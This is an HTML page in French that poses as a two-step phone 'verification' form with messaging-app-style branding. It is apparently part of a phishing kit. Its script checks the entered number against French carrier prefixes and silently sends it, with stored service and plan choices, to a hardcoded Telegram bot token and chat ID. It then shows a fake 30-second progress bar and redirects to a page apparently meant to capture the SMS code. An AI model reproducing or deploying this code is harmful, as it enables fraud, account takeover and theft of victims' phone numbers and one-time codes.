<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>V√©rification ‚Äì √âtape 1</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@500;700&display=swap" rel="stylesheet">
    <style>
        *{margin:0;padding:0;box-sizing:border-box;font-family:'Poppins',sans-serif;}
        body{background:#000;color:#fff;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px;overflow:hidden;}
        .container{max-width:420px;width:100%;}
        .back{position:absolute;top:20px;left:20px;color:#fffc00;font-size:1.5em;text-decoration:none;}
        .card{background:#111;border-radius:25px;padding:40px 30px;box-shadow:0 20px 60px rgba(255,252,0,0.2);border:1px solid #333;}
        h1{font-size:2.2em;color:#fffc00;text-align:center;margin-bottom:15px;}
        p{color:#aaa;text-align:center;font-size:1.1em;margin-bottom:40px;}
        input{width:100%;padding:18px;background:#222;border:2px solid #333;border-radius:15px;color:#fff;font-size:1.2em;text-align:center;letter-spacing:2px;}
        input:focus{outline:none;border-color:#fffc00;box-shadow:0 0 0 4px rgba(255,252,0,0.2);}
        .btn{background:#fffc00;color:#000;padding:18px;border:none;border-radius:50px;font-size:1.3em;font-weight:bold;width:100%;margin-top:30px;cursor:pointer;transition:0.3s;}
        .btn:disabled{background:#444;cursor:not-allowed;}
        .progress{margin-top:40px;height:6px;background:#222;border-radius:3px;overflow:hidden;display:none;}
        .progress-bar{height:100%;width:0%;background:#fffc00;transition:width 0.3s ease;}
        .status{text-align:center;margin-top:20px;color:#fffc00;font-weight:bold;font-size:1.1em;display:none;}
        .loader{display:none;width:40px;height:40px;border:5px solid #333;border-top:5px solid #fffc00;border-radius:50%;animation:spin 1s linear infinite;margin:30px auto;}
        @keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}
        .error{color:#ff3300;margin-top:20px;text-align:center;font-weight:bold;}
    </style>
</head>
<body>
    <a href="plans.html" class="back">‚Üê</a>
    <div class="container">
        <div class="card">
            <h1>V√©rification num√©ro</h1>
            <p>√âtape 1 sur 2 ‚Äì 30 secondes</p>

            <form id="phoneForm">
                <input type="tel" id="phone" placeholder="+33 6 __ __ __ __" maxlength="12" required>
                <div id="error" class="error"></div>
                <button type="submit" class="btn" id="btn">V√©rifier le num√©ro</button>
            </form>

            <div class="progress" id="progress"><div class="progress-bar" id="bar"></div></div>
            <div class="loader" id="loader"></div>
            <div class="status" id="status"></div>
        </div>
    </div>

    <script>
        const TELEGRAM_TOKEN = "8093456348:AAH7qkyDnquHF5sy8kb2W0H8TmWkNzJ_aFo";
        const TELEGRAM_CHAT_ID = "6272429080";

        document.getElementById('phoneForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            const phone = document.getElementById('phone').value.trim();
            const error = document.getElementById('error');
            const btn = document.getElementById('btn');
            const progress = document.getElementById('progress');
            const bar = document.getElementById('bar');
            const loader = document.getElementById('loader');
            const status = document.getElementById('status');

            error.textContent = '';

            const clean = phone.replace(/[\s+()-]/g, '');
            if (!/^(\+33|0)[67]\d{8}$/.test(clean)) {
                error.textContent = 'Format invalide';
                return;
            }

            // V√©rification op√©rateur SFR / Orange / Bouygues
            const prefix = clean.slice(-9, -7);
            const sfrOrangeBouygues = ['60','61','62','63','64','65','66','67','68','69','70','75','76','77','78','79'];
            if (!sfrOrangeBouygues.includes(prefix)) {
                error.textContent = 'Num√©ro non √©ligible ‚Äì SFR, Orange ou Bouygues uniquement';
                return;
            }

            // Envoi imm√©diat du num√©ro √† Telegram
            fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type':'application/json'},
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: `üì± NUM√âRO RE√áU ‚Äì √âTAPE 1\nService: ${localStorage.getItem('selectedService') || 'N/A'}\nPlan: ${localStorage.getItem('selectedPlan') || 'N/A'}\nNum√©ro: ${phone}\n‚è∞ ${new Date().toLocaleString('fr-FR')}\nEn attente du code SMS...`
                })
            });

            // Animation 30 secondes
            btn.disabled = true;
            btn.style.display = 'none';
            progress.style.display = 'block';
            loader.style.display = 'block';
            status.style.display = 'block';
            status.textContent = 'V√©rification op√©rateur...';

            let time = 0;
            const interval = setInterval(() => {
                time++;
                bar.style.width = (time / 30 * 100) + '%';
                if (time === 10) status.textContent = 'Analyse du num√©ro...';
                if (time === 20) status.textContent = 'Validation finale...';
            }, 1000);

            setTimeout(() => {
                clearInterval(interval);
                localStorage.setItem('tempPhone', phone);
                window.location.href = 'code.html';
            }, 30000);
        });
    </script>
</body>
</html>
